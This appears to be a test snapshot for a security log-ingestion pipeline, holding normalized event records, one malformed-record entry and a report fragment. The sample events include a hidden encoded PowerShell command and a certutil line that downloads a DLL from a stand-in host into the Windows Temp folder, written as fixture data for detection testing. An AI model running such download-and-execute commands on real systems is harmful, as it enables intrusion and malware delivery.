@@ -1,0 +1,584 @@
+{
+  "intake_decision": {
+    "confidence": 0.5,
+    "discovery_depth": 0,
+    "flag_state": "on",
+    "ida_class": null,
+    "input_id": "<VOLATILE:input_id>",
+    "iue_type": null,
+    "kind": "ndjson",
+    "lane": "structured",
+    "parent_input_id": null,
+    "provenance": {
+      "at": "<VOLATILE:at>",
+      "engine": "iue.intake",
+      "upstream_evidence_ids": [
+        "<HEX_ID:16>"
+      ],
+      "version": "1.0"
+    },
+    "reasons": [
+      "sniff:ndjson"
+    ],
+    "tenant_id": "__prev_public__"
+  },
+  "logical_events": [
+    {
+      "canonical_fields": {
+        "canonical.destination.ip": "185.220.101.7",
+        "canonical.event.action": "exec",
+        "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+        "canonical.file.hash.sha256": "<HEX_ID:64>",
+        "canonical.process.command_line": "powershell -nop -w hidden -enc SGVsbG8=",
+        "canonical.source.ip": "10.0.0.1"
+      },
+      "count": 3,
+      "event_id": "<HEX_ID:24>",
+      "first_seen": "<ISO_TIMESTAMP>",
+      "input_id": "<VOLATILE:input_id>",
+      "last_seen": "<ISO_TIMESTAMP>",
+      "provenance": {
+        "at": "<VOLATILE:at>",
+        "engine": "iue.aggregator",
+        "upstream_evidence_ids": [
+          "<HEX_ID:16>",
+          "iue.intake:<ISO_TIMESTAMP>",
+          "<HEX_ID:32>",
+          "iue.collectors.log:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>"
+        ],
+        "version": "1.0"
+      },
+      "record_refs": [
+        "<HEX_ID:24>",
+        "<HEX_ID:24>",
+        "<HEX_ID:24>"
+      ],
+      "source_file_id": "<HEX_ID:32>",
+      "tenant_id": "__prev_public__",
+      "variability": {
+        "canonical.event.category": [
+          "process"
+        ],
+        "canonical.event.timestamp": [
+          "<ISO_TIMESTAMP>",
+          "<ISO_TIMESTAMP>",
+          "<ISO_TIMESTAMP>"
+        ],
+        "canonical.source.host": [
+          "srv-01"
+        ],
+        "canonical.source.user": [
+          "jsmith"
+        ]
+      }
+    },
+    {
+      "canonical_fields": {
+        "canonical.destination.ip": "198.51.100.20",
+        "canonical.event.action": "file_write",
+        "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+        "canonical.file.hash.sha256": "a",
+        "canonical.process.command_line": "certutil.exe -f urlcache http://198.51.100.20/x.dll",
+        "canonical.source.ip": "10.0.0.1"
+      },
+      "count": 1,
+      "event_id": "<HEX_ID:24>",
+      "first_seen": "<ISO_TIMESTAMP>",
+      "input_id": "<VOLATILE:input_id>",
+      "last_seen": "<ISO_TIMESTAMP>",
+      "provenance": {
+        "at": "<VOLATILE:at>",
+        "engine": "iue.aggregator",
+        "upstream_evidence_ids": [
+          "<HEX_ID:16>",
+          "iue.intake:<ISO_TIMESTAMP>",
+          "<HEX_ID:32>",
+          "iue.collectors.log:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>"
+        ],
+        "version": "1.0"
+      },
+      "record_refs": [
+        "<HEX_ID:24>"
+      ],
+      "source_file_id": "<HEX_ID:32>",
+      "tenant_id": "__prev_public__",
+      "variability": {
+        "canonical.event.category": [
+          "file"
+        ],
+        "canonical.event.timestamp": [
+          "<ISO_TIMESTAMP>"
+        ],
+        "canonical.file.path": [
+          "C:\\Windows\\Temp\\x.dll"
+        ],
+        "canonical.source.host": [
+          "srv-01"
+        ],
+        "canonical.source.user": [
+          "jsmith"
+        ]
+      }
+    },
+    {
+      "canonical_fields": {
+        "canonical.destination.ip": "198.51.100.20",
+        "canonical.destination.port": "443",
+        "canonical.event.action": "network_connect",
+        "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+        "canonical.source.ip": "10.0.0.2"
+      },
+      "count": 1,
+      "event_id": "<HEX_ID:24>",
+      "first_seen": "<ISO_TIMESTAMP>",
+      "input_id": "<VOLATILE:input_id>",
+      "last_seen": "<ISO_TIMESTAMP>",
+      "provenance": {
+        "at": "<VOLATILE:at>",
+        "engine": "iue.aggregator",
+        "upstream_evidence_ids": [
+          "<HEX_ID:16>",
+          "iue.intake:<ISO_TIMESTAMP>",
+          "<HEX_ID:32>",
+          "iue.collectors.log:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>"
+        ],
+        "version": "1.0"
+      },
+      "record_refs": [
+        "<HEX_ID:24>"
+      ],
+      "source_file_id": "<HEX_ID:32>",
+      "tenant_id": "__prev_public__",
+      "variability": {
+        "canonical.event.category": [
+          "network"
+        ],
+        "canonical.event.timestamp": [
+          "<ISO_TIMESTAMP>"
+        ],
+        "canonical.source.host": [
+          "srv-02"
+        ],
+        "canonical.source.user": [
+          "rjones"
+        ]
+      }
+    },
+    {
+      "canonical_fields": {
+        "canonical.destination.ip": "198.51.100.20",
+        "canonical.destination.port": "443",
+        "canonical.event.action": "network_connect",
+        "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+        "canonical.source.ip": "10.0.0.2"
+      },
+      "count": 1,
+      "event_id": "<HEX_ID:24>",
+      "first_seen": "<ISO_TIMESTAMP>",
+      "input_id": "<VOLATILE:input_id>",
+      "last_seen": "<ISO_TIMESTAMP>",
+      "provenance": {
+        "at": "<VOLATILE:at>",
+        "engine": "iue.aggregator",
+        "upstream_evidence_ids": [
+          "<HEX_ID:16>",
+          "iue.intake:<ISO_TIMESTAMP>",
+          "<HEX_ID:32>",
+          "iue.collectors.log:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>"
+        ],
+        "version": "1.0"
+      },
+      "record_refs": [
+        "<HEX_ID:24>"
+      ],
+      "source_file_id": "<HEX_ID:32>",
+      "tenant_id": "__prev_public__",
+      "variability": {
+        "canonical.event.category": [
+          "network"
+        ],
+        "canonical.event.timestamp": [
+          "<ISO_TIMESTAMP>"
+        ],
+        "canonical.source.host": [
+          "srv-02"
+        ],
+        "canonical.source.user": [
+          "rjones"
+        ]
+      }
+    },
+    {
+      "canonical_fields": {
+        "canonical.event.action": "login_success",
+        "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+        "canonical.source.ip": "203.0.113.99"
+      },
+      "count": 1,
+      "event_id": "<HEX_ID:24>",
+      "first_seen": "<ISO_TIMESTAMP>",
+      "input_id": "<VOLATILE:input_id>",
+      "last_seen": "<ISO_TIMESTAMP>",
+      "provenance": {
+        "at": "<VOLATILE:at>",
+        "engine": "iue.aggregator",
+        "upstream_evidence_ids": [
+          "<HEX_ID:16>",
+          "iue.intake:<ISO_TIMESTAMP>",
+          "<HEX_ID:32>",
+          "iue.collectors.log:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>",
+          "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>"
+        ],
+        "version": "1.0"
+      },
+      "record_refs": [
+        "<HEX_ID:24>"
+      ],
+      "source_file_id": "<HEX_ID:32>",
+      "tenant_id": "__prev_public__",
+      "variability": {
+        "canonical.event.category": [
+          "identity"
+        ],
+        "canonical.event.timestamp": [
+          "<ISO_TIMESTAMP>"
+        ],
+        "canonical.source.host": [
+          "srv-03"
+        ],
+        "canonical.source.user": [
+          "admin"
+        ]
+      }
+    }
+  ],
+  "malformed": [
+    {
+      "input_id": "<VOLATILE:input_id>",
+      "offset": 6,
+      "parse_errors": [
+        "json: Unterminated string starting at: line 1 column 2 (char 1)"
+      ],
+      "parse_status": "malformed",
+      "parser_name": "ndjson",
+      "provenance": {
+        "at": "<VOLATILE:at>",
+        "engine": "iue.parsers.ndjson",
+        "upstream_evidence_ids": [
+          "<HEX_ID:16>",
+          "iue.intake:<ISO_TIMESTAMP>",
+          "<HEX_ID:32>",
+          "iue.collectors.log:<ISO_TIMESTAMP>",
+          "<HEX_ID:24>"
+        ],
+        "version": "1.0"
+      },
+      "raw_fields": {},
+      "record_id": "<HEX_ID:24>",
+      "source_file_id": "<HEX_ID:32>",
+      "tenant_id": "__prev_public__"
+    }
+  ],
+  "raw_payload": {
+    "bytes_len": 1725,
+    "discovery_depth": 0,
+    "encoding": "utf-8",
+    "input_id": "<VOLATILE:input_id>",
+    "mime": "application/x-ndjson",
+    "parent_input_id": null,
+    "provenance": {
+      "at": "<VOLATILE:at>",
+      "engine": "iue.collectors.log",
+      "upstream_evidence_ids": [
+        "<HEX_ID:16>",
+        "iue.intake:<ISO_TIMESTAMP>",
+        "<HEX_ID:32>"
+      ],
+      "version": "1.0"
+    },
+    "source_file_id": "<HEX_ID:32>",
+    "tenant_id": "__prev_public__"
+  },
+  "report_extraction_fragment": {
+    "logical_event_count": 5,
+    "logical_events": [
+      {
+        "canonical_fields": {
+          "canonical.destination.ip": "185.220.101.7",
+          "canonical.event.action": "exec",
+          "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+          "canonical.file.hash.sha256": "<HEX_ID:64>",
+          "canonical.process.command_line": "powershell -nop -w hidden -enc SGVsbG8=",
+          "canonical.source.ip": "10.0.0.1"
+        },
+        "count": 3,
+        "event_id": "<HEX_ID:24>",
+        "first_seen": "<ISO_TIMESTAMP>",
+        "input_id": "<VOLATILE:input_id>",
+        "last_seen": "<ISO_TIMESTAMP>",
+        "provenance": {
+          "at": "<VOLATILE:at>",
+          "engine": "iue.aggregator",
+          "upstream_evidence_ids": [
+            "<HEX_ID:16>",
+            "iue.intake:<ISO_TIMESTAMP>",
+            "<HEX_ID:32>",
+            "iue.collectors.log:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>"
+          ],
+          "version": "1.0"
+        },
+        "record_refs": [
+          "<HEX_ID:24>",
+          "<HEX_ID:24>",
+          "<HEX_ID:24>"
+        ],
+        "source_file_id": "<HEX_ID:32>",
+        "tenant_id": "__prev_public__",
+        "variability": {
+          "canonical.event.category": [
+            "process"
+          ],
+          "canonical.event.timestamp": [
+            "<ISO_TIMESTAMP>",
+            "<ISO_TIMESTAMP>",
+            "<ISO_TIMESTAMP>"
+          ],
+          "canonical.source.host": [
+            "srv-01"
+          ],
+          "canonical.source.user": [
+            "jsmith"
+          ]
+        }
+      },
+      {
+        "canonical_fields": {
+          "canonical.destination.ip": "198.51.100.20",
+          "canonical.event.action": "file_write",
+          "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+          "canonical.file.hash.sha256": "a",
+          "canonical.process.command_line": "certutil.exe -f urlcache http://198.51.100.20/x.dll",
+          "canonical.source.ip": "10.0.0.1"
+        },
+        "count": 1,
+        "event_id": "<HEX_ID:24>",
+        "first_seen": "<ISO_TIMESTAMP>",
+        "input_id": "<VOLATILE:input_id>",
+        "last_seen": "<ISO_TIMESTAMP>",
+        "provenance": {
+          "at": "<VOLATILE:at>",
+          "engine": "iue.aggregator",
+          "upstream_evidence_ids": [
+            "<HEX_ID:16>",
+            "iue.intake:<ISO_TIMESTAMP>",
+            "<HEX_ID:32>",
+            "iue.collectors.log:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>"
+          ],
+          "version": "1.0"
+        },
+        "record_refs": [
+          "<HEX_ID:24>"
+        ],
+        "source_file_id": "<HEX_ID:32>",
+        "tenant_id": "__prev_public__",
+        "variability": {
+          "canonical.event.category": [
+            "file"
+          ],
+          "canonical.event.timestamp": [
+            "<ISO_TIMESTAMP>"
+          ],
+          "canonical.file.path": [
+            "C:\\Windows\\Temp\\x.dll"
+          ],
+          "canonical.source.host": [
+            "srv-01"
+          ],
+          "canonical.source.user": [
+            "jsmith"
+          ]
+        }
+      },
+      {
+        "canonical_fields": {
+          "canonical.destination.ip": "198.51.100.20",
+          "canonical.destination.port": "443",
+          "canonical.event.action": "network_connect",
+          "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+          "canonical.source.ip": "10.0.0.2"
+        },
+        "count": 1,
+        "event_id": "<HEX_ID:24>",
+        "first_seen": "<ISO_TIMESTAMP>",
+        "input_id": "<VOLATILE:input_id>",
+        "last_seen": "<ISO_TIMESTAMP>",
+        "provenance": {
+          "at": "<VOLATILE:at>",
+          "engine": "iue.aggregator",
+          "upstream_evidence_ids": [
+            "<HEX_ID:16>",
+            "iue.intake:<ISO_TIMESTAMP>",
+            "<HEX_ID:32>",
+            "iue.collectors.log:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>"
+          ],
+          "version": "1.0"
+        },
+        "record_refs": [
+          "<HEX_ID:24>"
+        ],
+        "source_file_id": "<HEX_ID:32>",
+        "tenant_id": "__prev_public__",
+        "variability": {
+          "canonical.event.category": [
+            "network"
+          ],
+          "canonical.event.timestamp": [
+            "<ISO_TIMESTAMP>"
+          ],
+          "canonical.source.host": [
+            "srv-02"
+          ],
+          "canonical.source.user": [
+            "rjones"
+          ]
+        }
+      },
+      {
+        "canonical_fields": {
+          "canonical.destination.ip": "198.51.100.20",
+          "canonical.destination.port": "443",
+          "canonical.event.action": "network_connect",
+          "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+          "canonical.source.ip": "10.0.0.2"
+        },
+        "count": 1,
+        "event_id": "<HEX_ID:24>",
+        "first_seen": "<ISO_TIMESTAMP>",
+        "input_id": "<VOLATILE:input_id>",
+        "last_seen": "<ISO_TIMESTAMP>",
+        "provenance": {
+          "at": "<VOLATILE:at>",
+          "engine": "iue.aggregator",
+          "upstream_evidence_ids": [
+            "<HEX_ID:16>",
+            "iue.intake:<ISO_TIMESTAMP>",
+            "<HEX_ID:32>",
+            "iue.collectors.log:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>"
+          ],
+          "version": "1.0"
+        },
+        "record_refs": [
+          "<HEX_ID:24>"
+        ],
+        "source_file_id": "<HEX_ID:32>",
+        "tenant_id": "__prev_public__",
+        "variability": {
+          "canonical.event.category": [
+            "network"
+          ],
+          "canonical.event.timestamp": [
+            "<ISO_TIMESTAMP>"
+          ],
+          "canonical.source.host": [
+            "srv-02"
+          ],
+          "canonical.source.user": [
+            "rjones"
+          ]
+        }
+      },
+      {
+        "canonical_fields": {
+          "canonical.event.action": "login_success",
+          "canonical.event.timestamp": "<ISO_TIMESTAMP>",
+          "canonical.source.ip": "203.0.113.99"
+        },
+        "count": 1,
+        "event_id": "<HEX_ID:24>",
+        "first_seen": "<ISO_TIMESTAMP>",
+        "input_id": "<VOLATILE:input_id>",
+        "last_seen": "<ISO_TIMESTAMP>",
+        "provenance": {
+          "at": "<VOLATILE:at>",
+          "engine": "iue.aggregator",
+          "upstream_evidence_ids": [
+            "<HEX_ID:16>",
+            "iue.intake:<ISO_TIMESTAMP>",
+            "<HEX_ID:32>",
+            "iue.collectors.log:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.parsers.ndjson:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>",
+            "iue.normalizers.field_map:<ISO_TIMESTAMP>",
+            "<HEX_ID:24>"
+          ],
+          "version": "1.0"
+        },
+        "record_refs": [
+          "<HEX_ID:24>"
+        ],
+        "source_file_id": "<HEX_ID:32>",
+        "tenant_id": "__prev_public__",
+        "variability": {
+          "canonical.event.category": [
+            "identity"
+          ],
+          "canonical.event.timestamp": [
+            "<ISO_TIMESTAMP>"
+          ],
+          "canonical.source.host": [
+            "srv-03"
+          ],
+          "canonical.source.user": [
+            "admin"
+          ]
+        }
+      }
+    ],
+    "logical_record_total": 7
+  }
+}
